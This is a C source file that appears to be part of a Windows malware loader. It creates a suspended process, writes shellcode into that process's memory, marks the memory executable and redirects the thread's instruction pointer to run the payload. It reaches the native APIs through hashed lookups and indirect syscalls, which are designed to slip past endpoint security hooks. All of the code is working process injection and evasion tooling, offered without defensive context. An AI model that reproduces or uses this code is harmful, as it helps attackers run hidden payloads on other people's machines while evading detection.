#include "Threading.h"
#include "box.h"

#pragma warning (disable:4996)

BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread,
	OUT PDWORD PID
)
{

	BOOL				State = TRUE;
	STARTUPINFOA		StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*PID = ProcessInfo.dwProcessId;
	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}


BOOL RemoteThreadHijack
(
	IN	HANDLE	hProcess,
	IN	PBYTE	pShellcode,
	IN	SIZE_T	sSizeOfShellcode,
	OUT PVOID*	ppAddress
)

{

	if (!hProcess || !pShellcode || sSizeOfShellcode == 0 || !ppAddress) {
		WARN("Invalid parameter to Remote Thread Hijacking");
		return FALSE;
	}

	SIZE_T					sBytesWritten		= 0;
	DWORD					dwOldProt			= 0;
	NTSTATUS				STATUS				= STATUS_SUCCESS;
	PVOID					rBuffer				= NULL;
	PUCHAR					localBuf			= NULL;
	SIZE_T					origSize			= sSizeOfShellcode;
	SIZE_T					regionSize			= sSizeOfShellcode;
	PIMAGE_EXPORT_DIRECTORY pImgDir				= NULL;
	SYSCALL_INFO			info				= { 0 };
	INSTRUCTIONS_INFO		syscallInfos[3]		= { 0 };


	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = sdbmrol16(
			Functions[i]
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}


	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sSizeOfShellcode);
	if (!localBuf) {
		WARN("HeapAlloc failed");
		return FALSE;
	}
	memcpy(localBuf, pShellcode, sSizeOfShellcode);

	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
		(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	printf("Allocated \n\\____[%zu] Bytes to Virtual Memory! \n", sSizeOfShellcode);

	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
		(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}


	OKAY("Wrote %zu Bytes to Virtual Memory via Indirect Syscalls!", sSizeOfShellcode);

	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
		(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Changed Allocation Protection from [RW] to [RX] Via Indirect Syscalls");

	*ppAddress = rBuffer;

	HeapFree(GetProcessHeap(), 0, localBuf);
	return TRUE;

}


BOOL HijackThread
(
	IN HANDLE hThread,
	IN PVOID  pRemoteAddress
)

{

	if (!hThread || hThread == INVALID_HANDLE_VALUE || !pRemoteAddress) {
		WARN("Invalid parameters to HijackThread");
		return FALSE;
	}

	NTSTATUS				STATUS			= STATUS_SUCCESS;
	ULONG					suspendedCount	= 0;
	PIMAGE_EXPORT_DIRECTORY pImgDir			= NULL;
	SYSCALL_INFO			info			= { 0 };
	INSTRUCTIONS_INFO		syscallInfos[4] = { 0 };

	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;


	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtGetContextThread",
		"NtSetContextThread",
		"NtResumeThread",
		"NtWaitForSingleObject"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = sdbmrol16(
			Functions[i]
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}


	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtGetContextThread
	STATUS = ((NTSTATUS(*)(HANDLE, PCONTEXT))SyscallInvoker)
		(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtGetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully got Thread Context!");

	ThreadCtx.Rip = (DWORD64)pRemoteAddress;

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtSetContextThread
	STATUS = ((NTSTATUS(*)(HANDLE, PCONTEXT))SyscallInvoker)
		(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtSetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully set Thread Context!");

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtResumeThread
	STATUS = ((NTSTATUS(*)(HANDLE, PULONG))SyscallInvoker)
		(hThread, &suspendedCount);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtResumeThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	INFO("Resuming Thread....");

	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtWaitForSingleObject
	STATUS = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
		(hThread, FALSE, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWaitForSingleObject Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}


	INFO("Waiting for Thread to Finish Executing...");


CLEANUP:

	if (pRemoteAddress)
		VirtualFree(pRemoteAddress, 0, MEM_RELEASE);

	if (hThread)
		CloseHandle(hThread);

	return TRUE;
}
